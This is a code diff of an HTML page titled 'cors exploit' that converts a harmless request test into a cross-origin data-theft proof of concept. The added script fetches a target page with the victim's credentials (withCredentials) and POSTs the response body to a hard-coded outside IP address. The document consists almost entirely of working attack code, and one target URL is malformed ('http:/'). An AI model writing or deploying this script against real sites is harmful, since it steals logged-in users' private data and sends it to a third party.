@@ -1,22 +1,35 @@
 <!DOCTYPE>
 <html>
+<h1>cors exploit</h1>
 <script type="text/javascript">
-function loadXMLDoc()
+function exploit()
 {
-    var xhr = new XMLHttpRequest();
-
-    xhr.onreadystatechange=function()
+    var xhr1;
+    var xhr2;
+    if(window.XMLHttpRequest)
     {
-        if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response
+        xhr1 = new XMLHttpRequest();
+        xhr2 = new XMLHttpRequest();
+    }
+    else
+    {
+        xhr1 = new ActiveXObject("Microsoft.XMLHTTP");
+        xhr2= new ActiveXObject("Microsoft.XMLHTTP");
+    }
+    xhr1.onreadystatechange=function()
+    {
+        if(xhr1.readyState == 4 && xhr1.status == 200) 
         {
-            var datas=xhr.responseText;
-            alert(datas);
+            var datas=xhr1.responseText;
+            xhr2.open("POST","http://139.224.42.111/api/user/passport/auth/getUserInfo","true");
+            xhr2.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+            xhr2.send("z0="+escape(datas));      
         }
     }
-    //request vuln page
-    xhr.open("GET","http://139.224.42.111","true") //网页地址
-    xhr.send();
+    xhr1.open("GET","http:/192.168.1.1/index.php","true") 
+    xhr1.withCredentials = true;        
+    xhr1.send();
 }
-loadXMLDoc();
+exploit();
 </script>
 </html>
